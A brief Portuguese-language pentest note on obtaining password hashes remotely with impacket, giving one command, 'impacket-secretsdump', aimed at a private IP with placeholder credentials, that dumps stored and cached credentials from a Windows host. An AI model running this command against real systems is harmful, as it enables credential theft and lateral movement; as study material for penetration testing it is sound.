<h1 align="center"> Obtendo hashes remotamente</h1>
<hr>

O impacket tambem consegue nos trazer de forma automatizada a obtencao de hashes , incluindo hashes de memoria ou cache.

Uma simples execucao dessas, permite descobrir novos usuarios, hashes as vezes senhas em texto claros.

```sh
impacket-secretsdump user:pass@172.18.1.60
```